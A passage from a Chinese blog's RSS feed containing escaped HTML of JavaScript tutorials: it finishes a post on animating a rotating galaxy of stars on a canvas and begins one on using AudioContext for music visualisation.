&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">render&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">requestAnimationFrame&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">energy&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 清空屏幕
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;black&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillRect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">draw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">energy&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 开始渲染动画！
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以在&lt;a class="link" href="https://codepen.io/weak_ptr/pen/pQyJQQ" target="_blank" rel="noopener"
>codepen&lt;/a>查看代码效果。&lt;/p>
&lt;p>完成！&lt;/p>
&lt;h3 id="15-银河">1.5 银河&lt;/h3>
&lt;p>绘制银河的核心在于随机分布的星星绕着同一中心点旋转，分为两步来讲，第一步是随机分布，这很简单，用&lt;code>Math.random&lt;/code>就好了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="c1">// star 部分略
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="kr">class&lt;/span> &lt;span class="nx">Galaxy&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stars&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[];&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;2d&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stars&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="c1">// 随机生成一定数量的星星，初始化星星位置和大小。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Star&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">30&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">33&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">render&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energy&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energyChangeRate&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 清空屏幕
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillStyle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;black&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fillRect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">star&lt;/span> &lt;span class="k">of&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stars&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">draw&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">energy&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">canvas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;background-canvas&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 确保不会变形
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetWidth&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">offsetHeight&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">galaxy&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Galaxy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">galaxy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">render&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">requestAnimationFrame&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">galaxy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">render&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以在&lt;a class="link" href="https://codepen.io/weak_ptr/pen/jQqPoQ" target="_blank" rel="noopener"
>codepen&lt;/a>查看效果和完整代码。&lt;/p>
&lt;h3 id="16-旋转起来">1.6 旋转起来！&lt;/h3>
&lt;p>【加点细节预警】&lt;/p>
&lt;p>接下来我们为星星准备轨道参数，让它们动起来！&lt;/p>
&lt;p>首先修改&lt;code>Star&lt;/code>类，加入几个字段。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">class&lt;/span> &lt;span class="nx">Star&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">y&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">radius&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">lightness&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">orbit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">speed&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">radius&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">radius&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">x&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">y&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">lightness&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">orbit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">orbit&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// 轨道
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">speed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">speed&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// 运动速度
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">t&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// 三角函数x轴参数，用 sin/cos 组合计算位置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="c1">// 下略
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>修改初始化代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="c1">// 前略
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">longerAxis&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">diameter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">round&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sqrt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">longerAxis&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">longerAxis&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">longerAxis&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">longerAxis&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">maxOrbit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">diameter&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stars&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="c1">// 随机生成一定数量的星星，初始化星星位置和大小。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Star&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">30&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">maxOrbit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// 随机轨道
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// 随机速度
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">random&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">100&lt;/span> &lt;span class="c1">// 随机位置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 后略
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在&lt;code>Galaxy&lt;/code>里加入控制移动的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nx">move&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">star&lt;/span> &lt;span class="k">of&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stars&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">orbit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">width&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">orbit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">canvas&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">height&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">orbit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">star&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">speed&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后每一帧进行移动！&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">function&lt;/span> &lt;span class="nx">render&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">requestAnimationFrame&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">galaxy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">galaxy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">move&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// 动起来！
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>大功告成！&lt;/p>
&lt;p>在&lt;a class="link" href="https://codepen.io/weak_ptr/pen/NENGYm" target="_blank" rel="noopener"
>codepen&lt;/a>查看完整源码！&lt;/p>
&lt;h3 id="17-待续">1.7 待续&lt;/h3>
&lt;blockquote>
&lt;p>PS：不保证粘贴的代码都能跑，反正 codepen 上是都能的。&lt;/p>
&lt;/blockquote></description></item><item><title>AudioContext技术和音乐可视化（1）</title><link>https://nnnewb.github.io/blog/p/audiocontext%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%961/</link><pubDate>Wed, 07 Nov 2018 02:48:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/audiocontext%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%961/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>因为自己搭了个博客，一时兴起，就想写个动态的博客背景。毕竟用 django 后端渲染，前端只有 jquery 和 bootstrap 已经够 low 了，虽说极简风格也很棒，但是多少有点亮眼的东西才好办不是吗。&lt;/p>
&lt;p>转载注明来源。&lt;/p>
&lt;p>为了方便讲解，整个思路分为两个部分：音乐播放和背景绘制。&lt;/p>
&lt;h2 id="一音乐播放">一、音乐播放&lt;/h2>
&lt;h3 id="11-audiocontext">1.1 AudioContext&lt;/h3>
&lt;p>概述部分懒得自己写，参考 MDN 的描述。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>AudioContext&lt;/strong>接口表示由音频模块连接而成的音频处理图，每个模块对应一个&lt;a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/API/AudioNode" target="_blank" rel="noopener"
>&lt;code>AudioNode&lt;/code>&lt;/a>。&lt;strong>AudioContext&lt;/strong>可以控制它所包含的节点的创建，以及音频处理、解码操作的执行。做任何事情之前都要先创建&lt;strong>AudioContext&lt;/strong>对象，因为一切都发生在这个环境之中。&lt;/p>
&lt;/blockquote>
&lt;h3 id="12-浏览器支持状况">1.2 浏览器支持状况&lt;/h3>
&lt;p>&lt;code>AudioContext标准&lt;/code>目前还是草案，不过新 chrome 已经实现了。我使用的 chrome 版本如下。&lt;/p>
&lt;pre>&lt;code>版本 70.0.3538.77（正式版本） （64 位）
&lt;/code>&lt;/pre>&lt;p>如果发现 console 报错或者其他问题请检查浏览器版本，所有支持的浏览器可以在这个&lt;a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext" target="_blank" rel="noopener"
>链接&lt;/a>查看。&lt;/p>
&lt;h3 id="13-audiocontext-和音频处理图">1.3 AudioContext 和音频处理图&lt;/h3>
&lt;p>关于&lt;code>AudioContext&lt;/code>我的了解不是很深入，所以只在需要用到的部分进行概述。&lt;/p>
&lt;p>首先，关于&lt;strong>音频处理图&lt;/strong>的概念。&lt;/p>
&lt;p>这个名词不甚直观，我用过虚幻，所以用虚幻的&lt;code>Blueprint&lt;/code>来类比理解。音频处理图，其实是一系列音频处理的模块，连接构成一张数据结构中的“图”，从一般使用的角度来讲，一个播放音频的图，就是&lt;code>AudioSource -&amp;gt; AudioContext.destination&lt;/code>，两个节点构成的图。其中有很多特殊的节点可以对音频进行处理，比如音频增益节点&lt;code>GainNode&lt;/code>。&lt;/p>
&lt;p>对于音频处理的部分介绍就到这里为止，毕竟真的了解不多，不过从 MDN 的文档看，可用的处理节点还是非常多的，就等标准制订完成了。&lt;/p>
&lt;h3 id="14-加载音频文件并播放">1.4 加载音频文件并播放&lt;/h3>
&lt;p>音频文件加载使用典型的&lt;code>JavaScript&lt;/code>接口&lt;code>FileReader&lt;/code>实现。&lt;/p>
&lt;p>一个非常简单的实例是这样&lt;/p>
&lt;p>首先是 html 里写上 input&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
